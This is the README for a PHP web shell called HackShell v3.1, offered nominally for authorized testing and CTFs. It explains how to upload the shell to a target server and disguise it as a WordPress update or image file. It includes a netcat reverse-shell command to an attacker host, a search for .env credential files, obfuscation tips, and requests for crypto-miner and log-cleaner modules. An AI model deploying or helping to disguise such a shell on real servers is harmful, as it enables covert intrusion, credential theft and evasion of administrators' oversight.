# 🧰 HackShell v3.1 – Web-Based PHP Shell

A stealthy, feature-rich web shell for authorized server administration, penetration testing, and CTF challenges. Provides a terminal-like interface to execute system commands, browse files, upload/download content, manage databases, and more.

> **⚠️ Disclaimer**  
> This tool is for **educational purposes and authorized testing only**. Unauthorized access to computer systems is illegal. The author (`IMApurbo`) is not responsible for any misuse.

![Preview](https://img.shields.io/badge/PHP-7.4%2B-blue) ![License](https://img.shields.io/badge/License-MIT-green)

---

## 🔐 Features

- **Secure Access** – Hardcoded secret key authentication (change before use)
- **Terminal Emulation** – Execute arbitrary system commands
- **File Manager** – Browse, edit, delete, download, and upload files
- **Process & Network Recon** – List running processes and open ports
- **Database Client** – Query MySQL databases via PDO
- **Privilege Escalation Check** – `whoami`, `id`, `sudo -l` output
- **Environment Variables** – View all server environment data
- **File Compression** – Create ZIP archives on the fly
- **Stealth Mode** – `error_reporting(0)` + custom 404 on invalid key
- **Typewriter Effect** – Retro CLI feel for command outputs

---

## 📦 Installation

1. Upload both files to your target server (e.g., `/var/www/html/`).
2. Rename `hackshell3.php` to something obscure (e.g., `wp‑update.php`).
3. Change the `$SECRET_KEY` inside `hackshell3.php` and the matching key in `Web-Accessv3.html` (line with `<!--Secret key: ... -->`).
4. Access `Web-Accessv3.html` in a browser, enter the key, and you'll be redirected to the shell.

```bash
# Example rename
mv hackshell3.php 404.png.php
```

---

## 🚀 Usage

### Step 1 – Access Portal
Open `Web-Accessv3.html` and enter the secret key.

```html
<!-- In Web-Accessv3.html, line ~4 -->
<!--Secret key: x4i9z2k7m8n3p6q0r5t1v8w9y2 -->
```

### Step 2 – Shell Interface
Once authenticated, you get:

| Section | Action |
|---------|--------|
| **Terminal Access** | Run any system command |
| **File Infiltration** | Upload files (bypasses basic restrictions) |
| **File Modification** | Edit text files directly |
| **Process Recon** | `ps aux` output |
| **Network Intel** | `netstat -tulnp` or `ss -tulnp` |
| **Database Access** | Connect to MySQL, run queries |
| **Privilege Check** | `whoami`, `id`, `sudo -l` |
| **File Compression** | ZIP directories/files |
| **System Exploration** | Browse file tree with full CRUD |

---

## 🛠️ Configuration

### Secret Key
- **HTML file** – inside `<!--Secret key: ... -->` (not security through obscurity, change it)
- **PHP file** – `$SECRET_KEY = "your-strong-key";`

### PHP Requirements
- `shell_exec()` enabled (disable in production if not needed)
- `ZipArchive` class for compression
- `PDO_MySQL` for database queries
- File uploads enabled (`file_uploads = On`)

### Web Server
- Apache / Nginx with PHP 7.4+
- Directory where the script resides must be writable for uploads/logs

---

## 🧪 Example Commands

```bash
# Linux recon
whoami; id; uname -a

# Reverse shell (netcat)
nc -e /bin/sh attacker-ip 4444

# Find config files
find /var/www -name "*.env" 2>/dev/null
```

---

## 📁 File Structure

```
.
├── Web-Accessv3.html        # Login portal with hidden key
└── hackshell3.php           # Main shell backend (rename me!)
```

---

## 🧩 Obfuscation Tips (for Red Teams)

- Rename `.php` to `.png.php` or `.inc`
- Embed the HTML portal inside a fake 404 page
- Use `base64_decode()` or `gzinflate()` on the key parameter
- Add IP‑whitelisting inside the PHP file

---

## 📜 License

MIT License – see [LICENSE](LICENSE) file.

Copyright (c) 2025 **IMApurbo**

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED.

---

## 🤝 Contributing

Pull requests are welcome for:
- Additional modules (e.g., port scanning, crypto miners)
- Better error handling
- Stealth improvements (log cleaner, self‑destruct)

---

## 📬 Contact

**Author:** IMApurbo  
**GitHub:** [https://github.com/IMApurbo](https://github.com/IMApurbo)

> *For educational use only. Don't be a script kiddie – understand what you run.*
```

